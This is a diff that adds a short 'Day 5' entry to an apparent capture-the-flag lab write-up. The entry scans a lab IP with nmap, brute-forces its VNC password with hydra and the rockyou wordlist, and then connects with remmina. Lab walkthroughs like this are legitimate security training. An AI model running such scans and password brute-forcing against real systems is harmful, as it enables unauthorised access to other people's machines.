@@ -95,10 +95,29 @@ Answer
 
 ## Day 5: He knows when you're awake
 
+scan the target
+
+```
+nmap -sS -sV -T4 10.10.26.253
+```
+
+![image](https://user-images.githubusercontent.com/90561566/205795643-91daec7e-efcc-4291-9c7b-a67fe71e8fa2.png)
+
+bruteforce vnc server
+
+```
+hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.26.253 -v -f
+```
 
 
 
 
+
+
+
+open remmina in your linux distro
+
+![image](https://user-images.githubusercontent.com/90561566/205795132-9531c268-cf0b-4a82-86cf-44efffb7d31d.png)
 
 
 
